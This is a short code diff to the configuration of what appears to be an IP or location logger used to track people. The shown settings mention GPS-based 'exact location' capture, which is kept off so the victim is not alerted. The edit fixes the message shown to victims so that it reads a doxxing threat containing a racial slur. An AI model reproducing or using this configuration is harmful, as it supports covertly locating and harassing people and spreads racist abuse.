@@ -28,8 +28,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { 
-        "doMessage": True, levaste dox nigger# Enable the custom message?
-        "message": levaste dox nigger"", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "levaste dox nigger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
